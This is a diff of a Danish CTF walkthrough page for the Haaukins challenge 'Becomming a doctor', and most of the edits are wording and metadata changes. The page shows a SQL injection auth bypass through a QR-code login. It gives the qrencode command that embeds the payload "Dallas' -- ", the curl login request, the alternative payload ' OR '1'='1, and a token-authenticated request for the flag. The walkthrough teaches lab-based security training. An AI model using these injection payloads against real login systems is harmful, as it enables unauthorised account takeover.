@@ -3,14 +3,18 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Haaukins: Becomming a doctor — tutorial (SQLi via QR-login)</title>
+<title>Haaukins: Becomming a doctor, tutorial (SQLi via QR-login)</title>
 <meta name="description" content="Guide til Haaukins Becomming a doctor: login&#x27;et læser et QR-billedes JSON ind i en SQL-query; injicér en auth-bypass i QR&#x27;en for at logge ind som en doctor, og hent flaget fra det doctor-only /drugs-endpoint.">
 <link rel="canonical" href="https://lolcatatonia.github.io/haaukins-walkthroughs/becomming-a-doctor.html">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Haaukins: Becomming a doctor — tutorial (SQLi via QR-login)">
+<meta property="og:title" content="Haaukins: Becomming a doctor, tutorial (SQLi via QR-login)">
 <meta property="og:description" content="Guide til Haaukins Becomming a doctor: login&#x27;et læser et QR-billedes JSON ind i en SQL-query; injicér en auth-bypass i QR&#x27;en for at logge ind som en doctor, og hent flaget fra det doctor-only /drugs-endpoint.">
 <meta property="og:url" content="https://lolcatatonia.github.io/haaukins-walkthroughs/becomming-a-doctor.html">
-<meta name="twitter:card" content="summary">
+<meta property="og:image" content="https://lolcatatonia.github.io/haaukins-walkthroughs/assets/og-default.png">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://lolcatatonia.github.io/haaukins-walkthroughs/assets/og-default.png">
 <script type="application/ld+json">{"@context": "https://schema.org", "@type": "TechArticle", "headline": "Becomming a doctor", "description": "Guide til Haaukins Becomming a doctor: login'et læser et QR-billedes JSON ind i en SQL-query; injicér en auth-bypass i QR'en for at logge ind som en doctor, og hent flaget fra det doctor-only /drugs-endpoint.", "url": "https://lolcatatonia.github.io/haaukins-walkthroughs/becomming-a-doctor.html", "inLanguage": "da", "about": {"@type": "Thing", "name": "Haaukins CTF"}}</script>
 <link rel="stylesheet" href="assets/style.css">
 <script src="assets/gloss.js" defer></script>
@@ -23,7 +27,7 @@
 <p class="subtitle">"Manipulate the QR" = SQL-injection i QR-login'et → doctor-token → beskyttet endpoint.</p>
 <div class="badges"><span class="badge cat">Web exploitation</span><span class="badge">Haaukins CTF</span></div>
 <div class="callout">🎓 <strong>Prøv selv først.</strong> Trinene viser metoden; det konkrete flag ligger i en sammenklappelig spoiler nederst. Haaukins-flag er ofte per-instans, så det er <em>fremgangsmåden</em> der tæller.</div>
-<div class="callout">📚 <strong>Baggrund:</strong> denne opgave bygger på en fælles teknik — læs primeren: <a href="kom-i-gang.html">Kom i gang: VPN, Hosts og lab-opsætning</a>.</div>
+<div class="callout">📚 <strong>Baggrund:</strong> denne opgave bygger på en fælles teknik. Læs primeren: <a href="kom-i-gang.html">Kom i gang: VPN, Hosts og lab-opsætning</a>.</div>
 <h2>Hvad går opgaven ud på?</h2>
 <p>Fortsættelsen af <a href="why-http-qr.html">Why is this running HTTP?</a> Hospital-API'et logger ind
              via et uploadet QR (<code>POST /users/login</code>, QR = JSON <code>{username,password}</code> → et
@@ -31,7 +35,7 @@
              <em>"manipulate the content of the QR code and become a doctor."</em></p>
 <h2>Recon</h2>
 <p><code>GET /shifts</code> er <strong>uautentiseret</strong> og lister alle doctors + deres usernames/ids.
-             Login udsteder et JWT med blot <code>{id, username}</code> (ingen rolle) — serveren slår doctor-status op pr.
+             Login udsteder et JWT med blot <code>{id, username}</code> (ingen rolle), serveren slår doctor-status op pr.
              bruger. Du skal altså have et token udstedt for en <em>eksisterende doctor</em>.</p>
 <h2>Generér QR-billedet</h2>
 <p><code><span class="gloss" tabindex="0" data-tip="Genererer et QR-kode-billede ud fra en given tekst/JSON-streng.">qrencode</span></code> er typisk ikke installeret på en frisk Kali. Installér det der hvor
@@ -42,13 +46,13 @@ qrencode -o doctor.png "{\"username\":\"Dallas' -- \",\"password\":\"x\"}"</code
              <code>nix shell nixpkgs#qrencode</code> på lab-hosten, med billedet hjem som base64, samme
              resultat. <code>apt install</code> er den naturlige vej på en almindelig Kali.)</p>
 <h2>SQL-injection i QR-login&#x27;et</h2>
-<p>QR'ens JSON parses server-side ind i en SQL-login-query — klassisk <strong>auth-bypass</strong>. Du har
+<p>QR'ens JSON parses server-side ind i en SQL-login-query, klassisk <strong>auth-bypass</strong>. Du har
              ikke en doctors password, så kommentér password-tjekket ud med et username fra <code>/shifts</code>
              (her <code>Dallas</code>), det er derfor QR-indholdet ovenfor bruger netop det navn:</p>
              <pre><code># SQL: ... WHERE username='Dallas' -- ' AND password='x'   (password-check udkommenteret)
 curl -F "qr=@doctor.png" http://&lt;host&gt;/api/v1/users/login
 #   -> {"id":"…","username":"Dallas","doctor":true,"token":"&lt;JWT&gt;"}</code></pre>
-             <p>(<code>password=' OR '1'='1</code> logger ind som <em>første</em> bruger — brug username-comment for at
+             <p>(<code>password=' OR '1'='1</code> logger ind som <em>første</em> bruger. Brug i stedet username-comment for at
              ramme en <strong>bestemt</strong> doctor.)</p>
 <h2>Hent flaget</h2>
 <pre><code>curl http://&lt;host&gt;/api/v1/drugs -H "Authorization: Bearer &lt;JWT&gt;"
@@ -68,7 +72,7 @@ rammer en BESTEMT bruger, mens <code>' OR 1=1</code> bare rammer den første. Og
 brugernavne fra uautentiserede endpoints først, de gør en målrettet injektion mulig.</p>
 <footer>
 Del af <a href="index.html">Haaukins CTF-tutorials</a>. <a href="https://www.haaukins.dk/" target="_blank">Haaukins</a>
-er en dansk undervisningsplatform til sikkerhedstræning (AAU / De Danske Cybermesterskaber) — alle opgaver
+er en dansk undervisningsplatform til sikkerhedstræning (AAU, De Danske Cybermesterskaber). Alle opgaver
 løses på platformens egne, formålsbyggede lab-miljøer, aldrig på andres systemer. Guiden forudsætter du selv
 har autoriseret adgang (fx som studerende eller deltager) og er løsningsstøtte til at lære metoden, ikke en
 genvej uden om selv at forstå den.
